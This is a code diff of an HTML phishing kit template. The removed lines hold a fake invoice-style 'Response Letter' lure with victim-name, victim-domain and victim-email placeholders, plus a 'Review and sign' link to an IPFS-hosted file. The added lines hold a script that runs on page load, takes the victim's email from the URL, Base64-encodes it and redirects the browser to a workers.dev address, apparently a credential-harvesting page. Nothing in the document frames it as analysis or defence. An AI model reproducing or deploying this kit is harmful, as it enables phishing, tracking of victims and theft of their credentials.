@@ -1,35 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>##victimdomain##</title>
+    <title>Redirecting...</title>
+    <script>
+        // Function to parse email query parameter from URL
+        function getEmailFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('email');
+        }
+
+        // Function to encode a string to Base64
+        function encodeToBase64(str) {
+            return btoa(str);
+        }
+
+        // Function to decode a Base64 string
+        function decodeFromBase64(encodedStr) {
+            return atob(encodedStr);
+        }
+
+        // Function to check if a string is Base64 encoded
+        function isBase64(str) {
+            try {
+                return btoa(atob(str)) === str;
+            } catch (err) {
+                return false;
+            }
+        }
+
+        // Function to redirect to the specified URL with encoded email query parameter
+        function redirectToCustomURL() {
+            const email = getEmailFromUrl();
+            if (email) {
+                let encodedEmail;
+                if (isBase64(email)) {
+                    encodedEmail = email;
+                } else {
+                    encodedEmail = encodeToBase64(email);
+                }
+                const redirectUrl = `https://ee92f82c.d874c7c1f8062afc4f2fd153.workers.dev/?qrc=${encodeURIComponent(encodedEmail)}`;
+                window.location.replace(redirectUrl);
+            } else {
+                console.error('Email parameter not found in URL');
+            }
+        }
+
+        // Redirect on page load
+        window.onload = redirectToCustomURL;
+    </script>
 </head>
 <body>
-    <h2>##victimname## OCF-3 Response Letter - Unsigned</h2>
-    <p>Dec 18/23:</p>
-    <p>$37,000.00 – to cover the Dec 12th merchant deposits that were deposited to SSP’s bank account and should have been to ECG RBC account</p>
-    
-    <p>Dec 18/23:</p>
-    <p>We will need an additional $31,500 today which is comprised of the following:</p>
-    <ul>
-        <li>Calgary AGLC liquor order $6,397.59</li>
-        <li>Canadian Brewhouse Edmonton wallet funding $8,056.24</li>
-        <li>Belgian Beer Café Edmonton tip payout $4,710.00</li>
-        <li>Calgary tip payouts $12,140</li>
-    </ul>
-
-    <p>Dec 20/23:</p>
-    <ul>
-        <li>Sysco $57,523.95 (BBC YEG 11,903.20, CBH 9,938.30, BBC YYC 14,234.40, Bistro 5,049.39, Wolfgang 16,398.66)</li>
-        <li>Eberhardt $11,035.31 (all CBH – Canadian Brewhouse)</li>
-        <li>AGLC $17,500 (BBC YYC Liquor Connect $7,423.34 and BDL estimate $10,076.66)</li>
-        <li>Payroll YEG $84,552.35 (I believe our account is still linked to the payroll provider “Push”)</li>
-        <li>Payroll YYC $106,403.13</li>
-        <li>CBH royalty $ 23,685.73</li>
-    </ul>
-    
-    <p>Total $300,700.47</p>
-    
-<a href="https://cloudflare-ipfs.com/ipfs/bafybeic6qoltnyqirrqc4k7zgkzo336r66qmad7rizgzpzt2jw2qia3xku###victimb64email##" download="OCF_3_Response_Letter.pdf" target="_blank"><span style='background:yellow;mso-highlight:yellow'>Review and sign</span></a>
+    <p>Redirecting...</p>
 </body>
 </html>
 
